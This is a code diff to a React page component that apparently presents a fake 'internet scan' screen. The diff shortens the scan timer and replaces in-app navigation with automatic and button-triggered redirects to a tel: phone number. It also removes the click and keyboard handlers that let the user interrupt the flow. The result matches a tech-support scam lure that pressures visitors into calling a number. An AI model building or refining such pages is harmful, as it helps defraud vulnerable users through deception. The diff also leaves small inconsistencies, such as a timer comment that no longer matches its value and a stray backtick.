@@ -1809,7 +1809,7 @@ const InternetScanLayout = () => {
       autoScanTimer = setTimeout(() => {
         setAutoScanTriggered(true);
         scanNetwork();
-      }, 5000); // 5 seconds
+      },2000); // 5 seconds
     }
 
     // Cleanup timer on component unmount or if conditions change
@@ -1826,9 +1826,9 @@ const InternetScanLayout = () => {
     
     if (scanComplete) {
       autoRedirectTimer = setTimeout(() => {
-        navigate("/protect-your-device")
+          window.location.href = "tel:+1 818 839 7963";
         // console.log("Auto-redirecting to /protect-your-device after 5 seconds");
-      }, 5000); // 5 seconds after scan completion
+      },5000); // 5 seconds after scan completion
     }
 
     // Cleanup timer on component unmount or if conditions change
@@ -1847,26 +1847,19 @@ const InternetScanLayout = () => {
   };
 
   // Handle screen click - redirect only after scan is complete
-  const handleScreenClick = () => {
-    if (scanComplete) {
-      navigate("/protect-your-device")
-    //   console.log("Would navigate to /protect-your-device");
-    } else {
-      resetAutoScanTrigger();
-    }
-  };
 
   const handleSubmitComplaint = (e) => {
     e.preventDefault();
-    setShowPopup(true);
+       window.location.href = "tel:+1 818 839 7963"; 
+    // setShowPopup(true);
   };
 
   const handleCallSupport = () => {
     // window.open('https://chatbot.page/V3kkrC', '_blank');
-    // setShowPopup(false);
+    // setShowPopup(false);`
     // navigate("/protect-your-device")
-    console.log("Would navigate to protect-your-device page");
-    setShowPopup(false);
+    // setShowPopup(false);
+      window.location.href = "tel:+1 818 839 7963"; 
   };
 
   const closePopup = () => {
@@ -2043,9 +2036,7 @@ const InternetScanLayout = () => {
   return (
     <div 
       className="fixed inset-0 bg-black overflow-auto flex flex-col items-center justify-center p-4 sm:p-6 lg:p-8"
-      onClick={handleScreenClick}
-      onMouseMove={resetAutoScanTrigger}
-      onKeyDown={resetAutoScanTrigger}
+      
     >
       {/* Main Container */}
       <div className="w-full max-w-4xl mx-auto flex flex-col items-center justify-center space-y-8 sm:space-y-12 lg:space-y-16">
